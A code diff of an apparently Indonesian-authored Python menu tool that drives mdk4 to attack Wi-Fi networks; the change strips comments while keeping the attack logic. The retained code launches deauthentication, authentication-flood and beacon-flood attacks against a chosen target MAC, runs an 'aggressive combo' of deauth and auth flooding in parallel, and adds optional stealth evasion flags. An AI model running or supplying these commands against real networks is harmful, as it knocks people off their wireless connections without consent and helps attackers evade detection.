@@ -204,11 +204,6 @@ def restore_network(interface):
     console.print(Panel("Network Restored.", border_style="green")); time.sleep(1.5)
 
 def run_attack(commands):
-    """
-    Fungsi untuk menjalankan satu atau beberapa perintah mdk4 secara paralel.
-    Menerima argumen berupa List (satu perintah) atau List of Lists (beberapa perintah).
-    """
-    # Pastikan input selalu berupa List of Lists untuk konsistensi paralelisme
     if not any(isinstance(i, list) for i in commands):
         commands = [commands]
 
@@ -219,19 +214,16 @@ def run_attack(commands):
         for cmd in commands:
             final_cmd = cmd
             if OPERATION_MODE == 1:
-                # Sisipkan flag stealth setelah 'mdk4' dan interface (index 0:sudo, 1:mdk4, 2:iface)
                 final_cmd = cmd[:3] + evasion + cmd[3:]
 
             display_cmd = " ".join(final_cmd)
             console.print(f"[bold red]LAUNCHING:[/bold red] [dim]{display_cmd}[/dim]")
 
-            # Gunakan os.setsid untuk membuat grup proses baru agar pembersihan lebih mudah
             p = subprocess.Popen(final_cmd, preexec_fn=os.setsid)
             processes.append(p)
 
         cyber_print("Attack Active! Press Ctrl+C to stop.", "bold yellow")
 
-        # Menunggu semua proses aktif
         for p in processes:
             p.wait()
 
@@ -239,7 +231,6 @@ def run_attack(commands):
         console.print("\n[bold red][!] Interrupted. Killing all processes...[/bold red]")
         for p in processes:
             try:
-                # Bunuh seluruh grup proses
                 os.killpg(os.getpgid(p.pid), signal.SIGTERM)
             except: pass
         subprocess.run(["sudo", "pkill", "mdk4"], capture_output=True)
@@ -336,12 +327,10 @@ def main_menu():
                         elif act == '4': run_attack(base_cmd + ["b", "-a", target_mac, "-m", "-s", "200"])
                         elif act == '5': run_attack(base_cmd + ["d", "-B", target_mac])
 
-                        # --- PERBAIKAN LOGIKA COMBO (PARALEL) ---
                         elif act == '6':
                             console.print("[bold red]RUNNING AGGRESSIVE COMBO (PARALEL)...[/bold red]")
                             cmd_deauth = base_cmd + ["d", "-B", target_mac]
                             cmd_auth = base_cmd + ["a", "-a", target_mac, "-s", "500"]
-                            # Kirim daftar perintah ke run_attack untuk dijalankan paralel
                             run_attack([cmd_deauth, cmd_auth])
                         # ----------------------------------------
 
